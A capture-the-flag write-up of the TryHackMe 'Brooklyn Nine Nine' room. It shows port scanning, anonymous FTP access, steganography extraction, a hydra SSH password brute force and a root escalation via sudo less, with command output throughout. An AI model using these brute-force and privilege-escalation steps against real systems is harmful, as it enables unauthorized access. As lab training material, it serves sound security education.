---
title: "TryHackMe - Brooklyn Nine Nine"
categories:
  - TryHackMe
tags:
  - privesc
  - writeup
  - tryhackme
  - less
  - hydra
---
This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.

## Scanning
Scanning all ports.

```bash
$ rustscan -a 10.10.20.214 --ulimit 10000 -- -sC -sV -A -v -Pn             
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.20.214:21
Open 10.10.20.214:22
Open 10.10.20.214:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-19 05:30 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:30
Completed NSE at 05:30, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:30
Completed NSE at 05:30, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:30
Completed NSE at 05:30, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 05:30
Completed Parallel DNS resolution of 1 host. at 05:30, 13.02s elapsed
DNS resolution of 1 IPs took 13.02s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 05:30
Scanning 10.10.20.214 [3 ports]
Discovered open port 80/tcp on 10.10.20.214
Discovered open port 21/tcp on 10.10.20.214
Discovered open port 22/tcp on 10.10.20.214
Completed Connect Scan at 05:30, 0.19s elapsed (3 total ports)
Initiating Service scan at 05:30
Scanning 3 services on 10.10.20.214
Completed Service scan at 05:30, 6.39s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.20.214.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:30
NSE: [ftp-bounce 10.10.20.214:21] PORT response: 500 Illegal PORT command.
Completed NSE at 05:30, 5.48s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:30
Completed NSE at 05:30, 1.32s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:30
Completed NSE at 05:30, 0.00s elapsed
Nmap scan report for 10.10.20.214
Host is up, received user-set (0.19s latency).
Scanned at 2021-01-19 05:30:38 EST for 13s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.25.205
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQjh/Ae6uYU+t7FWTpPoux5Pjv9zvlOLEMlU36hmSn4vD2pYTeHDbzv7ww75UaUzPtsC8kM1EPbMQn1BUCvTNkIxQ34zmw5FatZWNR8/De/u/9fXzHh4MFg74S3K3uQzZaY7XBaDgmU6W0KEmLtKQPcueUomeYkqpL78o5+NjrGO3HwqAH2ED1Zadm5YFEvA0STasLrs7i+qn1G9o4ZHhWi8SJXlIJ6f6O1ea/VqyRJZG1KgbxQFU+zYlIddXpub93zdyMEpwaSIP2P7UTwYR26WI2cqF5r4PQfjAMGkG1mMsOi6v7xCrq/5RlF9ZVJ9nwq349ngG/KTkHtcOJnvXz
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBItJ0sW5hVmiYQ8U3mXta5DX2zOeGJ6WTop8FCSbN1UIeV/9jhAQIiVENAW41IfiBYNj8Bm+WcSDKLaE8PipqPI=
|   256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2hV8Nm+RfR/f2KZ0Ub/OcSrqfY1g4qwsz16zhXIpqk
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

FTP with anonymous login, SSH, and HTTP.

## Enumeration
Let's download the files from FTP first.

```bash
$ ftp 10.10.20.214 
Connected to 10.10.20.214.
220 (vsFTPd 3.0.3)
Name (10.10.20.214:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> mget *
mget note_to_jake.txt? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.00 secs (24.1603 kB/s)
```

note_to_jake.txt:

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

We can bruteforce Jake's password. But, let's see what's inside port 80 first.

<a href="/assets/images/tryhackme/brooklyn/1.png"><img src="/assets/images/tryhackme/brooklyn/1.png"></a>

Let's check the source code.

<a href="/assets/images/tryhackme/brooklyn/2.png"><img src="/assets/images/tryhackme/brooklyn/2.png"></a>

Steganography. Let's download the background photo and let's do the work. I tried every basic steganography and didn't work so i run `gobuster`, maybe there is hidden directories or files.

```bash
$ gobuster dir -u http://10.10.20.214 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,jpg,html,css,jpeg,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.20.214
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     jpg,html,css,jpeg,txt,php
[+] Timeout:        10s
===============================================================
2021/01/19 05:39:15 Starting gobuster
===============================================================
/index.html (Status: 200)
/photo.jpg (Status: 200)
```

`photo.jpg` there, let's download it and do basic steganography again.

```bash
$ steghide extract -sf photo.jpg     
Enter passphrase: 
wrote extracted data to "note.txt".
```

We got `note.txt`, here is the content:

```
----------- StillNoob was here ------------------
```

Nothing :/... 

## Gaining Access
We got a username before and SSH port is open. Let's bruteforce Jake's password.

```bash
$ hydra -l jake -P /usr/share/wordlists/rockyou.txt  -t 16 -u 10.10.20.214 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-19 05:45:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.20.214:22/
[22][ssh] host: 10.10.20.214   login: jake   password: 987654321
```

Let's SSH with user `jake`.

```bash
$ ssh jake@10.10.20.214             
The authenticity of host '10.10.20.214 (10.10.20.214)' can't be established.
ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.20.214' (ECDSA) to the list of known hosts.
jake@10.10.20.214's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$
```

user.txt:

```bash
jake@brookly_nine_nine:/home$ ls -la
total 20
drwxr-xr-x  5 root root 4096 May 18  2020 .
drwxr-xr-x 24 root root 4096 May 19  2020 ..
drwxr-xr-x  5 amy  amy  4096 May 18  2020 amy
drwxr-xr-x  6 holt holt 4096 May 26  2020 holt
drwxr-xr-x  6 jake jake 4096 May 26  2020 jake
jake@brookly_nine_nine:/home$ cd holt
jake@brookly_nine_nine:/home/holt$ ls -la
total 48
drwxr-xr-x 6 holt holt 4096 May 26  2020 .
drwxr-xr-x 5 root root 4096 May 18  2020 ..
-rw------- 1 holt holt   18 May 26  2020 .bash_history
-rw-r--r-- 1 holt holt  220 May 17  2020 .bash_logout
-rw-r--r-- 1 holt holt 3771 May 17  2020 .bashrc
drwx------ 2 holt holt 4096 May 18  2020 .cache
drwx------ 3 holt holt 4096 May 18  2020 .gnupg
drwxrwxr-x 3 holt holt 4096 May 17  2020 .local
-rw-r--r-- 1 holt holt  807 May 17  2020 .profile
drwx------ 2 holt holt 4096 May 18  2020 .ssh
-rw------- 1 root root  110 May 18  2020 nano.save
-rw-rw-r-- 1 holt holt   33 May 17  2020 user.txt
jake@brookly_nine_nine:/home/holt$ cat user.txt
REDACTED
```

## Escalation
Checking sudo privileges.

```bash
jake@brookly_nine_nine:/home/holt$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

We can run `less` as sudo! Let's use this to escalate our privilege.

```bash
jake@brookly_nine_nine:/home/holt$ sudo less /etc/profile
# whoami
root
```

root.txt:

```bash
root@brookly_nine_nine:/home/amy# cd /root
root@brookly_nine_nine:/root# ls
root.txt
root@brookly_nine_nine:/root# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: REDACTED

Enjoy!!
```

## Alternative to gain access
- Using `stegcracker` to bruteforce the password to get the hidden file from brooklyn photo.

## Lesson learned
- Anonymous FTP login with leftover note.
- Weak user's password so we can bruteforce the SSH login.
- Escalate privilege with less as sudo.

